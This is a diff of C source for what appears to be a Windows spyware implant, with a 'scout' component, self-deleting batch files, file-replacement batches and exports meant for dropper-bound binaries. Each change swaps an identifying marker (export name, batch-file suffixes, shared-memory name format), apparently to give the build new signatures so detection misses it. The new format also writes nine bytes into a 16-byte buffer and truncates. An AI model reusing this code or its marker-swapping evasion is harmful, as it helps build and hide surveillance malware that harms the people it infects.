@@ -44,7 +44,8 @@ HANDLE hScoutSharedMemory;
 //__declspec(dllexport) PWCHAR jfk31d1QQ(PULONG pSynchro)
 //__declspec(dllexport) PWCHAR reuio841001a(PULONG pSynchro) // questa viene richiamata dai meltati
 //__declspec(dllexport) PWCHAR pqjjslanf(PULONG pSynchro) // questa viene richiamata dai meltati
-__declspec(dllexport) PWCHAR robertlee(PULONG pSynchro) // questa viene richiamata dai meltati
+//__declspec(dllexport) PWCHAR robertlee(PULONG pSynchro) // questa viene richiamata dai meltati
+__declspec(dllexport) PWCHAR eflmakfil(PULONG pSynchro) // questa viene richiamata dai meltati
 {
 #ifdef _DEBUG
 	OutputDebugString(L"[+] Setting uMelted to TRUE\n");
@@ -403,7 +404,8 @@ VOID DeleteAndDie(BOOL bDie)
 		ULONG uTick = GetTickCount();
 		do
 		{
-			_snwprintf_s(pBatFileName, 32766, _TRUNCATE, L"%s\\%d98355.bat", pTempPath, uTick++);
+			//_snwprintf_s(pBatFileName, 32766, _TRUNCATE, L"%s\\%d98355.bat", pTempPath, uTick++);
+			_snwprintf_s(pBatFileName, 32766, _TRUNCATE, L"%s\\%d437890.bat", pTempPath, uTick++);
 			hFile = CreateFile(pBatFileName, GENERIC_READ|GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
 			if (hFile && hFile != INVALID_HANDLE_VALUE)
 				break;
@@ -457,15 +459,17 @@ VOID DeleteAndDie(BOOL bDie)
 
 PCHAR GetScoutSharedMemoryName()
 {
-	CHAR strFormat[] = { '%', '0', '2', 'X', '%', '0', '2', 'X', '%', '0', '2', 'X', '%', '0', '2', 'X', '%', '0', '2', 'X', '%', '0', '2', 'X', '%', '0', '2', 'X', '%', '0', '2', 'X', '\0' };
+	//CHAR strFormat[] = { '%', '0', '2', 'X', '%', '0', '2', 'X', '%', '0', '2', 'X', '%', '0', '2', 'X', '%', '0', '2', 'X', '%', '0', '2', 'X', '%', '0', '2', 'X', '%', '0', '2', 'X', '\0' };
+	CHAR strFormat[] = { '%', '0', '2', 'X', '%', '0', '2', 'X', '%', '0', '2', 'X', '%', '0', '2', 'X', '%', '0', '2', 'X', '%', '0', '2', 'X', '%', '0', '2', 'X', '%', '0', '2', 'X', '%', '0', '2', 'X', '\0' };
 	PCHAR pName = (PCHAR) malloc(16);
 	memset(pName, 0x0, 16);
 
 	_snprintf_s(pName, 
 		16, 
 		_TRUNCATE, 
-		strFormat, 
-		pServerKey[5], pServerKey[6], pServerKey[5], pServerKey[4], pServerKey[3], pServerKey[2], pServerKey[1], pServerKey[0]);
+		strFormat, 		
+		pServerKey[5], pServerKey[6], pServerKey[5], pServerKey[4], pServerKey[3], pServerKey[2], pServerKey[1], pServerKey[0], pServerKey[2]);
+		//pServerKey[5], pServerKey[6], pServerKey[5], pServerKey[4], pServerKey[3], pServerKey[2], pServerKey[1], pServerKey[0]);
 
 	return pName;
 }
@@ -713,7 +717,8 @@ VOID CreateDeleteBatch(PWCHAR pFileName, PWCHAR *pBatchOutName)
 	uTick = GetTickCount();
 	do
 	{
-		_snwprintf_s(pBatchName, 32766, _TRUNCATE, L"%s\\%d02322.bat", pTempPath, uTick++);
+		//_snwprintf_s(pBatchName, 32766, _TRUNCATE, L"%s\\%d02322.bat", pTempPath, uTick++);
+		_snwprintf_s(pBatchName, 32766, _TRUNCATE, L"%s\\%d124904.bat", pTempPath, uTick++);
 		hFile = CreateFile(pBatchName, GENERIC_READ|GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
 		if (hFile && hFile != INVALID_HANDLE_VALUE)
 			break;
@@ -743,7 +748,8 @@ VOID CreateReplaceBatch(PWCHAR pOldFile, PWCHAR pNewFile, PWCHAR *pBatchOutName)
 	uTick = GetTickCount();
 	do
 	{
-		_snwprintf_s(pBatchName, 32766, _TRUNCATE, L"%s\\%d76833.bat", pTempPath, uTick++);
+		//_snwprintf_s(pBatchName, 32766, _TRUNCATE, L"%s\\%d76833.bat", pTempPath, uTick++);
+		_snwprintf_s(pBatchName, 32766, _TRUNCATE, L"%s\\%d391294.bat", pTempPath, uTick++);
 		hFile = CreateFile(pBatchName, GENERIC_READ|GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
 		if (hFile && hFile != INVALID_HANDLE_VALUE)
 			break;
